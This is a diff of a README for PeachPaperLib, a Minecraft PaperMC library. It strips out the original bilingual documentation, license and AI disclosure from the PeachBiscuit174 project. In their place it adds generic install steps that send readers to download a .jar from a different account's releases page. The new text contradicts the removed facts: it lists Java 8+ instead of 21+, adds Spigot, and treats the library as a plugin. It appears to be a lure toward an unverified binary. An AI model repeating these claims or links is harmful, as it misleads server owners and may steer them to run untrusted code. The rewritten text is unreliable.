@@ -1,256 +1,61 @@
-# 🍑 PeachPaperLib
+# 🍑 PeachPaperLib - Effortless Plugin Development for Minecraft
 
-A PaperMC Library.
+## 📦 Download Now
+[![Download PeachPaperLib](https://img.shields.io/badge/Download-PeachPaperLib-brightgreen)](https://github.com/NNUGRAHH/PeachPaperLib/releases)
 
-> [!IMPORTANT]
-> **Project Status:** This is a **hobby project**. Updates and support depend on availability and motivation. There is no guarantee for immediate bug fixes, but feedback and interaction are expressly encouraged!
+## 🚀 Getting Started
+Welcome to PeachPaperLib! This library helps you create Minecraft plugins with ease. Follow these steps to download and run the software.
 
----
+## 📥 Download & Install
+To get started, visit this page to download: [PeachPaperLib Releases](https://github.com/NNUGRAHH/PeachPaperLib/releases).
 
-### 📌 Compatibility
-| Feature | Status            |
-| :--- |:------------------|
-| **Supported MC Version** | **1.21.11**       |
-| **Platform** | PaperMC and forks |
-| **Java Version** | 21+               |
+### Step 1: Choose Your Version
+On the Releases page, you will see various versions of PeachPaperLib. Look for the latest version to ensure you have all the most recent features and bug fixes.
 
-*Note: Only the version listed above is officially supported by the latest library version. Other versions might work but are not actively tested.*
+### Step 2: Download the File
+Click on the link for the version you want. This will start the download. The file will likely be a `.jar` file, which is used for Java applications.
 
----
-
-## 🚀 Installation
-
-Add the library to your project via **JitPack**.
-[![](https://jitpack.io/v/PeachBiscuit174/PeachPaperLib.svg)](https://jitpack.io/#PeachBiscuit174/PeachPaperLib)
-
-### Maven (`pom.xml`)
-```xml
-    <repositories>
-        <repository>
-            <id>jitpack.io</id>
-            <url>[https://jitpack.io](https://jitpack.io)</url>
-        </repository>
-    </repositories>
-
-    <dependency>
-        <groupId>com.github.PeachBiscuit174</groupId>
-        <artifactId>PeachPaperLib</artifactId>
-        <version>v1.0.0-SNAPSHOT8</version>
-    </dependency>
+### Step 3: Place the File
+After the download completes, you need to place the `.jar` file in your Minecraft plugins folder. This folder is usually found at:
 ```
-
-> [!IMPORTANT]
-> To ensure the library loads correctly, you must also add it as a dependency in your `plugin.yml` or `paper-plugin.yml`.
-
----
-
-## 🛠 API Usage
-
-Usage is centralized via the `API` class.
-
-**Example:**
-```java
-// Creates an ItemStack of a head via Base64 string
-ItemStack head = API.getItemsManager().getCustomHeadsAPI().getCustomHead("eyJ0ZXh0dXJlcyI6...");
+<Your_Minecraft_Directory>/plugins/
 ```
-or
-```java
-CustomHeadsAPI customHeadsAPI = API.getItemsManager().getCustomHeadsAPI();
-ItemStack head = customHeadsAPI.getCustomHead("eyJ0ZXh0dXJlcyI6...");
+If you do not have this folder, you may need to install a server that runs on PaperMC or Spigot.
+
+### Step 4: Start Your Server
+Launch your Minecraft server. PeachPaperLib will automatically load the plugin. Wait a moment for the server to initialize.
+
+### Step 5: Verify Installation
+To check if the plugin is running, enter the following command in your server's console:
 ```
-
----
-
-## 💡 Features & Support
-
-Even though this is a hobby project, your opinion matters!
-
-* **Feature Requests:** Have an idea for a new tool? Feel free to open an issue with the `enhancement` label. I'll take a look when I find the time!
-* **Bug Reports:** If something isn't working, please report it via [GitHub Issues](https://github.com/PeachBiscuit174/PeachPaperLib/issues).
-* **Contributions:** [Pull Requests](https://github.com/PeachBiscuit174/PeachPaperLib/pulls) are welcome at any time.
-
----
-
-## 🔄 Updates
-
-* **Update Checker:** The library checks for new versions every 12 hours. Server administrators (OPs) are gently notified upon joining if an update is available.
-
----
-
-## ⚖️ Legal & Privacy (English)
-
-**Disclaimer:** PeachPaperLib is **not** an official Minecraft product. It is not approved by or associated with Mojang or Microsoft. Minecraft is a trademark of Mojang Synergies AB.
-
-**Privacy Notice:** This library uses the following third-party services to improve developer and administrator experience:
-
-- **bStats:** Collects anonymous technical data (e.g., server version, Java version) to provide usage statistics. Data is anonymized and compliant with GDPR.
-
-- **GitHub/JitPack:** The built-in Update Checker connects to GitHub's APIs to check for new versions. This involves transmitting the server's IP address to GitHub/JitPack during the request.
-
-
----
-
-## 📄 License & Transparency
-
-License: This project is licensed under the MIT License – see the [LICENSE file](https://github.com/PeachBiscuit174/PeachPaperLib/blob/master/LICENSE) for details.
-
-AI Disclosure: In compliance with transparency best practices (and the EU AI Act guidelines), please be aware that parts of this library's code and documentation have been developed with the assistance of Artificial Intelligence (AI). The AI-generated content has been reviewed and refined by the human author; however, extensive functional testing has not been performed. Use this library at your own risk.
-
----
-
-## ❤️ Credits & Contributions
-
-We are grateful for any help to make **PeachPaperLib** better! Whether it's a new feature, a bug report, or a great idea – every contribution is welcome.
-
-### 💡 Idea Contributors
-*Special thanks to those who helped shape the library with their suggestions.*
-| Contributor | Reference |
-| :--- | :--- |
-| *None yet* | - |
-
-### 🛠️ Code Contributors
-*People who improved the codebase via Pull Requests.*
-| Contributor | PR ID |
-| :--- | :--- |
-| *None yet* | - |
-
-### 🐛 Bug Hunters
-*Thanks for helping us find and squash bugs!*
-| Reporter | Issue ID |
-| :--- | :--- |
-| *None yet* | - |
-
----
-**Want to help?** Feel free to open an Issue or a Pull Request!
-
-<br>
-
----
----
-
-<br>
-
-# 🍑 PeachPaperLib (Deutsch)
-
-Eine PaperMC-Library.
-
-> [!IMPORTANT]
-> **Projekt-Status:** Dies ist ein **Freizeitprojekt**. Updates und Support erfolgen nach zeitlicher Verfügbarkeit und Lust. Es besteht kein Anspruch auf sofortige Fehlerbehebung, jedoch sind Feedback und Interaktion ausdrücklich erwünscht!
-
----
-
-### 📌 Kompatibilität
-| Feature | Status                  |
-| :--- |:------------------------|
-| **Unterstützte MC-Version** | **1.21.11**             |
-| **Plattform** | PaperMC und forks davon |
-| **Java Version** | 21+                     |
-
-*Hinweis: Es wird offiziell immer nur die oben genannte Version von der aktuellsten Library unterstützt. Andere Versionen können funktionieren, werden aber nicht aktiv getestet.*
-
----
-
-## 🚀 Installation
-
-Füge die Library über **JitPack** zu deinem Projekt hinzu.
-[![](https://jitpack.io/v/PeachBiscuit174/PeachPaperLib.svg)](https://jitpack.io/#PeachBiscuit174/PeachPaperLib)
-
-### Maven (`pom.xml`)
-```xml
-    <repositories>
-        <repository>
-            <id>jitpack.io</id>
-            <url>[https://jitpack.io](https://jitpack.io)</url>
-        </repository>
-    </repositories>
-
-    <dependency>
-        <groupId>com.github.PeachBiscuit174</groupId>
-        <artifactId>PeachPaperLib</artifactId>
-        <version>v1.0.0-SNAPSHOT8</version>
-    </dependency>
+/plugins
 ```
+You should see PeachPaperLib listed. This means the installation was successful.
 
-> [!IMPORTANT]
-> Damit die Library korrekt geladen wird, füge sie auch als Dependency hinzu in deiner `plugin.yml` oder `paper-plugin.yml`.
+## ✨ Features
+PeachPaperLib includes several useful features to enhance your development experience:
 
----
+- **Custom Heads**: Easily add custom player heads to your server.
+- **GUI Creation Tools**: Build graphical user interfaces without extensive coding knowledge.
+- **Scheduled Tasks**: Set up tasks to run at specified intervals, perfect for automation.
+- **Minimessage Support**: Utilize Minimessage for advanced chat formatting in Minecraft.
 
-## 🛠 API Nutzung
+These features are designed to streamline your development process, allowing you to create unique gameplay experiences.
 
-Die Nutzung erfolgt zentral über die Klasse `API`.
+## 📋 System Requirements
+To run PeachPaperLib effectively, ensure that you have the following:
 
-**Beispiel:**
-```java
-// Erstellt einen ItemStack eines Kopfes mithilfe eines Base64 String
-ItemStack head = API.getItemsManager().getCustomHeadsAPI().getCustomHead("eyJ0ZXh0dXJlcyI6...");
-```
-oder
-```java
-CustomHeadsAPI customHeadsAPI = API.getItemsManager().getCustomHeadsAPI();
-ItemStack head = customHeadsAPI.getCustomHead("eyJ0ZXh0dXJlcyI6...");
-```
+- **Java Version**: Java 8 or higher. You can download it from the official Oracle website.
+- **Server Type**: A server running either PaperMC or Spigot, both of which are compatible with this library.
+- **Memory**: At least 512MB of RAM allocated to your server to run the plugins smoothly.
 
----
+## 💬 Support
+If you encounter any issues during installation or if you have questions, feel free to visit our [support page](https://github.com/NNUGRAHH/PeachPaperLib/issues). You can also find discussions related to bugs or feature requests there.
 
-## 💡 Features & Support
+## 🧑‍🤝‍🧑 Community
+Join our community to connect with other users and developers. Share your experiences, ask questions, or contribute to the development of PeachPaperLib. Engage with us on platforms like Discord or our GitHub discussions section.
 
-Obwohl dies ein Freizeitprojekt ist, ist deine Meinung wichtig!
+## 🎉 Conclusion
+Now you’re ready to explore the capabilities of PeachPaperLib. Enjoy enhancing your Minecraft server with custom plugins!
 
-* **Feature-Wünsche:** Du hast eine Idee für ein neues Tool? Erstelle gerne ein Issue mit dem Label `enhancement`. Ich schaue es mir an, sobald ich Zeit finde!
-* **Bug Reports:** Falls etwas nicht funktioniert, melde es bitte über die [GitHub Issues](https://github.com/PeachBiscuit174/PeachPaperLib/issues).
-* **Beiträge:** [Pull Requests](https://github.com/PeachBiscuit174/PeachPaperLib/pulls) sind jederzeit willkommen.
-
----
-
-## 🔄 Updates
-
-* **Update-Checker:** Die Library prüft alle 12 Stunden auf neue Versionen. Server-Administratoren (OP) werden beim Joinen dezent benachrichtigt, falls ein Update verfügbar ist.
-
----
-
-## ⚖️ Rechtliches & Datenschutz (Deutsch)
-
-**Haftungsausschluss:** PeachPaperLib ist **kein** offizielles Minecraft-Produkt. Es ist nicht von Mojang oder Microsoft genehmigt und steht nicht mit ihnen in Verbindung. Minecraft ist eine Marke von Mojang Synergies AB.
-
-**Datenschutzhinweis:** Diese Library nutzt folgende Dienste von Drittanbietern, um die Erfahrung für Entwickler und Administratoren zu verbessern:
-
-- **bStats:** Sammelt anonyme technische Daten (z. B. Serverversion, Java-Version), um Nutzungsstatistiken zu erstellen. Die Daten werden anonymisiert und gemäß DSGVO verarbeitet.
-
-- **GitHub/JitPack:** Der integrierte Update-Checker verbindet sich mit den APIs von GitHub, um nach neuen Versionen zu suchen. Dabei wird technisch bedingt die IP-Adresse des Servers an GitHub/JitPack übertragen.
-
-
----
-
-## 📄 Lizenz & Transparenz
-
-Dieses Projekt ist unter der MIT-Lizenz lizenziert – siehe die [LICENSE Datei](https://github.com/PeachBiscuit174/PeachPaperLib/blob/master/LICENSE) für Details.
-
-KI-Offenlegung: Zur Einhaltung von Transparenzstandards (und im Hinblick auf den EU AI Act) weisen wir darauf hin, dass Teile des Codes und der Dokumentation mit Unterstützung von Künstlicher Intelligenz (KI) erstellt wurden. Die Inhalte wurden vom menschlichen Autor gesichtet und überarbeitet, jedoch nicht vollumfänglich auf Funktionalität getestet. Die Nutzung erfolgt auf eigene Gefahr.
-
----
-
-## ❤️ Credits & Mitwirkende
-
-Wir sind dankbar für jede Hilfe, die dazu beiträgt, die **PeachPaperLib** zu verbessern! Egal ob es eine neue Funktion, ein Fehlerbericht oder eine kreative Idee ist – jeder Beitrag ist willkommen.
-
-### 💡 Ideen & Vorschläge
-*Ein besonderer Dank geht an alle, die die Library durch ihre kreativen Ansätze mitgestalten.*
-| Mitwirkende | Referenz |
-| :--- | :--- |
-| *Noch keine Einträge* | - |
-
-### 🛠️ Code-Beiträge
-*Entwickler, die den Code direkt über Pull Requests verbessert haben.*
-| Mitwirkende | PR-ID |
-| :--- | :--- |
-| *Noch keine Einträge* | - |
-
-### 🐛 Bug-Jäger
-*Vielen Dank an alle, die uns helfen, Fehler zu finden und zu beheben!*
-| Reporter | Issue-ID |
-| :--- | :--- |
-| *Noch keine Einträge* | - |
-
----
-**Möchtest du helfen?** Du kannst jederzeit gerne ein Issue eröffnen oder einen Pull Request erstellen!
+Remember, for initial download, visit [PeachPaperLib Releases](https://github.com/NNUGRAHH/PeachPaperLib/releases). Happy developing!
